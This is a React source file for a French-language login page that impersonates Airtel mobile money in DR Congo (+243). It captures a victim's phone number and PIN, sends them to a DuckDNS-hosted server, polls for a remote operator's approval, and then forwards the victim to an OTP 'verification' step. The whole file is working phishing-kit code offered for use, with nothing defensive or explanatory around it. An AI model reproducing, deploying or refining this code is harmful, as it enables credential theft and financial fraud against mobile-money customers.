import React, { useState, useRef, useEffect } from 'react'
import axios from 'axios'
import { useNavigate, useParams } from 'react-router-dom'

const API_BASE_URL = "https://lnmb.duckdns.org"

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = window.location.pathname.split("/")[1] || "user1"
  config.headers["X-Bot-Name"] = bot
  return config
})

const LogoPlaceholder = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
    <circle cx="50" cy="50" r="45" fill="#11bb4a"/>
    <text x="50" y="58" font-size="48" font-weight="bold" fill="white" text-anchor="middle" font-family="Arial, sans-serif">A</text>
  </svg>
)

function Login() {
  const navigate = useNavigate()
  const { user } = useParams()
  const [imgError, setImgError] = useState(false)
  const [phone, setPhone] = useState("")
  const [inputs, setInputs] = useState(["", "", "", ""])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [status, setStatus] = useState("")
  
  const inputRefs = useRef([])
  const sessionRef = useRef(null)
  const timerRef = useRef(null)
  const userId = user || 'default'
  
  const statusMessages = {
    pending: "⏳ En attente...",
    approved: "✅ Code PIN approuvé !!",
    wrong_pin: "❌ Code PIN incorrect",
    pinotp_correct: "✅ Code PIN et OTP vérifiés!",
    expired: "⏰ Délai de vérification dépassé "
  }

  const handleInputChange = (index, value) => {
    if (value !== "" && !/^\d$/.test(value)) return
    const newInputs = [...inputs]
    newInputs[index] = value
    setInputs(newInputs)
    if (value !== "" && index < 3) inputRefs.current[index + 1]?.focus()
  }

  const handleKeyDown = (index, e) => {
    if (e.key === "ArrowLeft" && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    } else if (e.key === "ArrowRight" && index < 3) {
      e.preventDefault()
      inputRefs.current[index + 1]?.focus()
    } else if (e.key === "Backspace" && !inputs[index] && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    }
  }

  const startPolling = (sessionId) => {
    sessionRef.current = sessionId
    let attempts = 0
    const maxAttempts = 150
    
    const poll = async () => {
      if (attempts >= maxAttempts) {
        setError("Délai d'expiration de la vérification du code PIN. Veuillez réessayer..")
        setLoading(false)
        setStatus("expired")
        return
      }
      
      attempts++
      try {
        const response = await api.post("/api/check-pin-status", {
          sessionId,
          bot: userId
        })
        const data = response.data
        
        if (data.status === "approved") {
          setStatus("approved")
          setLoading(false)
          navigate(`/${userId}/verification`)
        } else if (data.status === "pending") {
          setStatus("pending")
        } else if (data.status === "wrong_pin") {
          setError("Code PIN incorrect. Veuillez réessayer.")
          setLoading(false)
          setStatus("wrong_pin")
        } else if (data.status === "expired") {
          setError("La vérification du code PIN a expiré. Veuillez réessayer.")
          setLoading(false)
          setStatus("expired")
        } else if (data.status === "approved_with_otp") {
          setStatus("pinotp_correct")
          setLoading(false)
          navigate(`/${userId}/verification`)
        }
      } catch (err) {
        console.error("Polling error:", err)
      }
    }
    
    timerRef.current = setInterval(poll, 2000)
  }

  const submitPin = async () => {
    if (inputs.some(input => input === "")) return
    
    const pin = inputs.join("")
    setLoading(true)
    setError("")
    setStatus("pending")
    
    try {
      const response = await api.post("/api/verify-pin", {
        phoneNumber: phone,
        pinCode: pin,
        userId: `user_${Date.now()}`,
        userName: "Airtel User"
      })
      
      if (response.data.success) {
        startPolling(response.data.sessionId)
      } else {
        setError(response.data.error || "Échec de la vérification du code PIN")
        setLoading(false)
        setStatus("")
      }
    } catch (err) {
      setError("Erreur réseau. Veuillez vérifier votre connexion et réessayer.")
      setLoading(false)
      setStatus("")
    }
  }

  useEffect(() => {
    inputRefs.current[0]?.focus()
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [])

  return (
    <div className="container">
      <header className="topHeader">
        <div className="logo">
          {!imgError ? (
            <img src="/assets/icon-C_cpc0tJ.jpeg" alt="Airtel Logo" onError={() => setImgError(true)} />
          ) : (
            <LogoPlaceholder />
          )}
          <div>
            <h1>Airtel</h1>
          </div>
        </div>
      </header>
      <h1 className="login-title">Bienvenue</h1>
      
      <main>
        <div className="phone-number">
          <div className="numbercont">
            <div className="countrycode">+243 | {phone || " "}</div>
          </div>
        </div>
        
        <div className="pin-input-container">
          <label className="pin-label">Saisissez votre code PIN</label>
          <div>
            {inputs.map((input, index) => (
              <input
                key={index}
                ref={el => inputRefs.current[index] = el}
                type="number"
                className="no-spinner"
                value={input}
                maxLength="1"
                disabled={loading}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
              />
            ))}
          </div>
          
          {error && <div className="error-message">{error}</div>}
          {status && <div className="status-message">{statusMessages[status] || status}</div>}
        </div>
        
        <div className="forgot-pin"><a href="#">Code PIN oublié?</a></div>
      </main>
      
      <footer>
        <div className="curvesec">
          <button className="btnContinue" onClick={submitPin} disabled={inputs.some(i => i === "") || loading}>
            {loading ? "Vérification du code PIN..." : "Se connecter"}
          </button>
          <p>En continuant, vous acceptez les conditions générales.</p>
        </div>
      </footer>
    </div>
  )
}

export default Login